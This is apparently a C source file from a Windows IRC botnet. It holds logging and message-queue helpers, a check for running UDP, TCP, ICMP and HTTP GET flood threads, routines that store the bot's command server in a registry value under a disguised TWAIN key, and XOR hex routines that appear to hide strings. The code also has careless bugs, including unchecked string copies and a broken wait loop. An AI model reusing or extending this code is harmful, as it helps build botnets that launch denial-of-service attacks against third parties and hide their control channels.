#include "StdAfx.h"
#include "extern.h"

extern int debug;
extern CRITICAL_SECTION cs;


char* fmterr(void)
{
	LPVOID lpMsgBuf = NULL;
	static char szInternal[255] = {0};
	
	FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR) &lpMsgBuf,0,NULL);
	
	lstrcpy(szInternal,(char*)lpMsgBuf);
	LocalFree(lpMsgBuf);
	return szInternal;
}

char* fmterr(DWORD err)
{
	LPVOID lpMsgBuf = NULL;
	static char szInternal[255] = {0};
	
	FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR) &lpMsgBuf,0,NULL);
	
	lstrcpy(szInternal,(char*)lpMsgBuf);
	LocalFree(lpMsgBuf);
	return szInternal;
}

void filedeb(char *msg)
{
	HANDLE hFile;
	DWORD dwWritten = 0;

	if(!strstr(msg, "\n"))
		strcat(msg, "\n");

	hFile = CreateFile(DEBUG_PATH, GENERIC_WRITE, 0, NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	SetFilePointer(hFile, 0L, 0, FILE_END);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFile, msg, strlen(msg), &dwWritten, NULL);
		CloseHandle(hFile);
	}
}

void fdeb(char *msg,...) 
{
	va_list ap;
	char string[32768];
	char stringout[32768];
	
	va_start(ap,msg);
	vsprintf(string, msg, ap);
	va_end(ap);

	wsprintf(stringout, "<%X> %s", GetCurrentThreadId(), string);
	OutputDebugString(stringout);
	filedeb(stringout);
}

void ircdeb(char *msg,...) {
	va_list ap;
	
	EnterCriticalSection(&cs);
	va_start(ap,msg);
	if(logmsgs_num >= MAX_LOG_MESSAGES) {
		LeaveCriticalSection(&cs);
		return;
	}
	vsprintf(logmsgs[logmsgs_num++],msg,ap);
	va_end(ap);
	LeaveCriticalSection(&cs);
}

void rawmsg(char *msg,...) {
	va_list ap;
	DWORD st;
	
	st = GetTickCount();
	EnterCriticalSection(&cs);
	va_start(ap,msg);
	if(rawmsgs_num >= MAX_LOG_MESSAGES) {
		LeaveCriticalSection(&cs);
		return;
	}
	vsprintf(rawmsgs[rawmsgs_num++],msg,ap);
	va_end(ap);
	LeaveCriticalSection(&cs);
	/* wait while msg is really sent */
	while ( rawmsgs_num || (GetTickCount() - st) / 1000 > 10) {};
	return;
}

void
hexdump(char *buffer, int size)
{
	int i,d;
	char szOut[128];
	char szTemp[128];
	
	szOut[0] = 0x0;
	deb("dumping buffer at %p size: %d\n", buffer, size);
	deb("hex: ");
	for(d=0 ;d<size; d++) {
		wsprintf(szOut,"hex: ");
		for(i=0 ;i<12;i++) 
		{
			wsprintf(szTemp, "0x%02x ", (u_char) buffer[d++]);
			lstrcat(szOut, szTemp);
		}
		deb("%s",szOut);
	}
	deb("end of dump.\n");
}

int ddos_running(void)
{
	if(IsTypeRunning(DDOS_UDP_THREAD) || IsTypeRunning(DDOS_TCP_THREAD) ||
		IsTypeRunning(DDOS_ICMP_THREAD) || IsTypeRunning(HTTP_GET_THREAD) )
		return 1;
	return 0;
}

void SetCoreServers(char *buffer)
{
	HKEY hkey;
	DWORD len;
	char core_string[255];
	
	deb("Setting core server in registry...");
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TWAIN_KEY, 0, KEY_WRITE, &hkey) != ERROR_SUCCESS)
		return;
	
	strncpy(core_string, buffer, 255);
	len = lstrlen(core_string) + 1;
	if(RegSetValueEx(hkey, "Core", 0, REG_SZ, (BYTE*) core_string, len) != ERROR_SUCCESS) {
		deb("RegSetValueEx: %s\n", FORMATERROR);
		return;
	}
	RegCloseKey(hkey);
	deb("Successfully changed core server to %s\n", core_string);
}

void GetCoreServers(char **buffer, WORD *CoreIrcPort)
{
	HKEY key;
	DWORD len, type;
	BYTE core_string[255];
	
	deb("Checking registry for core server change...");
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TWAIN_KEY, 0, KEY_READ, &key) != ERROR_SUCCESS)
		return;
	
	len = 255;
	if(RegQueryValueEx(key, "Core", 0, &type, (LPBYTE) core_string, &len) != ERROR_SUCCESS) {
		deb("RegQuery for coreserver: %s\n", FORMATERROR);
		return;
	}
	
	RegCloseKey(key);
	sscanf((char*) core_string, "%[^:]:%d", buffer[0], CoreIrcPort);
	deb("Server from registry: %s:%d\n", buffer, *CoreIrcPort);
}

void string_hex_xor(u_char *value, u_char *result, int xor, DWORD len) 
{
	DWORD i;
	u_char *p = result;
	
	memset(result, 0x0, (len * 2) + 1);
	for(i=0;i<len;i++) 
	{
		sprintf((char*) p, "%02X", xor ? value[i] ^ xor : value[i]);
		p += 2;
	}
	//deb("string_hex_xor: value [%s] result [%s] xor: 0x02x", value, result, xor);
}

void xor_hex_string(u_char *value, u_char *result, int xor)
{
	DWORD i = 0x0;
	u_char *p = result;
	u_char byte[3] = { 0x0, 0x0, 0x0 };
	u_char chr;
	
	memset((char*) result, 0x0, strlen((char*) value));
	while(value[i]) 
	{
		byte[0] = value[i++];
		byte[1] = value[i++];

		sscanf((char*) byte, "%x", &chr);

		(*p) = xor ? chr ^ xor : chr;
		//deb("hex: 0x%02x xor: 0x%02x", chr, (*p));
		p += 1;
	}
	//deb("xor_hex_string: value: [%s] result: [%s] xor: 0x%02x", value, result, xor);
}